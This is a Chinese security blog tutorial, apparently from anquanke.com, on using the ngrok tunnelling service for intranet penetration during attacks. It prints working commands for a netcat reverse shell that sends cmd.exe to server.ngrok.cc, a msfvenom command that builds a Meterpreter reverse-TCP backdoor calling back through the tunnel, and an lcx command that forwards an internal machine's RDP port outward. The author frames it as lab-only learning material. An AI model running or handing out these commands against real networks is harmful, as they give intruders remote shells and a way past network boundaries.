> 原文链接: https://www.anquanke.com//post/id/84590 


# 【技术分享】Ngrok内网穿透的几种利用


                                阅读量   
                                **245125**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p5.ssl.qhimg.com/t01e52efac0781c60ef.png)](https://p5.ssl.qhimg.com/t01e52efac0781c60ef.png)**

****

**作者：[Double8 ](http://bobao.360.cn/member/contribute?uid=269624429)**

**稿费：300RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**



**前言**

Ngrok的官方是这样介绍：一条命令解决的外网访问内网问题，本地WEB外网访问、本地开发微信、TCP端口转发。有tcp端口转发的功能，就尝试利用ngrok进行内网的穿透。Ngrok的网址：[http://www.ngrok.cc/](http://www.ngrok.cc/)。

渗透的时候，有时候我们是内网，对方服务器也是内网，而没有vps怎么办，而又想实现端口转发，而这时候可以利用ngrok进行tcp的端口转发，实现内网的穿透。而且支持mac，Linux和windows。

PS:本文具有一定的攻击性，只用于学习，以下实验都是在虚拟机上面实现，还要感谢佳哥的指导。

<br>

**Ngrok内网穿透的几种利用**

首先先到[http://www.ngrok.cc/login](http://www.ngrok.cc/login)这个平台登陆进行注册，然后就可以添加自己本地需要转发的地址和接收的端口。

[![](https://p1.ssl.qhimg.com/t0142cdc324936f7f91.png)](https://p1.ssl.qhimg.com/t0142cdc324936f7f91.png)

选择需要的服务，填上外网需要接收的端口，和转发到本地的端口和地址,地址可以随意填。

**<br>**

**进行nc的反弹**

192.168.1.100是kali上面的ip，先选择对应的Linux版本，然后在Linux上面执行这句命令。

```
./sunny clientid 客户端id
```

当看到这个界面的时候，就可以进行转发了。

[![](https://p3.ssl.qhimg.com/t01db8ffaa6cc442ceb.png)](https://p3.ssl.qhimg.com/t01db8ffaa6cc442ceb.png)

在要接收的Linux机器上面执行这个命令,进行监听：

 [![](https://p2.ssl.qhimg.com/t01cf0909c79c25fe2d.png)](https://p2.ssl.qhimg.com/t01cf0909c79c25fe2d.png)

在内网的机器当中执行这个命令：

```
nc -vv server.ngrok.cc 11226 -e c:WindowsSystem32cmd.exe
```

 [![](https://p2.ssl.qhimg.com/t01ed781969aa9b069c.png)](https://p2.ssl.qhimg.com/t01ed781969aa9b069c.png)

成功接收，有点意思吧。

<br>

**msf的反弹**

当没有一台外网的vps的时候，msf的利用是比较难的。但利用这个可以实现端口的转发。就可以实现即使在内网中也可以玩转msf。用法如下：

先启动服务，kali上面执行这个命令：./sunny clientid 客户端id。http://p6.qhimg.com/t01d4c3fff918b2f55e.png

这里实现的是由外网的端口转发到内网的12345端口当中:server.ngrok.cc(119.28.62.35):11226-&gt;192.168.1.102（kali的ip）:12345.

先生成一个后门：

```
msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=119.28.62.35 LPORT=11226 -f exe x&gt; back.exe
```

然后把后门放在内网的机器上面执行。

在kali上面监听的结果：

[![](https://p2.ssl.qhimg.com/t01628c99f63b2d5e48.png)](https://p2.ssl.qhimg.com/t01628c99f63b2d5e48.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011b0ee88f20808a19.png)

成功反弹。

<br>

**lcx实现的转发**

这次是在windows上面启动ngrok，所以选择相应的版本，先执行《Sunny-Ngrok启动工具.bat》，再输入客户端id：

[![](https://p1.ssl.qhimg.com/t019a956c80bc4ebf3d.png)](https://p1.ssl.qhimg.com/t019a956c80bc4ebf3d.png)

当看到以下界面就说明成功运行：

[![](https://p2.ssl.qhimg.com/t01a2c257526b21a2c2.png)](https://p2.ssl.qhimg.com/t01a2c257526b21a2c2.png)

首先本地进行监听：

```
lcx -listen 12345 33891
```

[![](https://p2.ssl.qhimg.com/t019ba867088aeba133.png)](https://p2.ssl.qhimg.com/t019ba867088aeba133.png)

然后将内网的3389转发出去，执行以下命令：

```
lcx.exe -slave server.ngrok.cc 11226 127.0.0.1 3389
```

[![](https://p3.ssl.qhimg.com/t019ba867088aeba133.png)](https://p3.ssl.qhimg.com/t019ba867088aeba133.png)

然后用访问本地33891端口进行连接：

[![](https://p5.ssl.qhimg.com/t01baef68b73eeff01a.png)](https://p5.ssl.qhimg.com/t01baef68b73eeff01a.png)

成功连接机器。

[![](https://p0.ssl.qhimg.com/t0150b48eed3ec04422.png)](https://p0.ssl.qhimg.com/t0150b48eed3ec04422.png)

   除了以上的方法，因为实现了端口转发，想利用的方式还是很多的，利用ssh端口的利用等。这里就不举例子了，自己可以尝试实现。
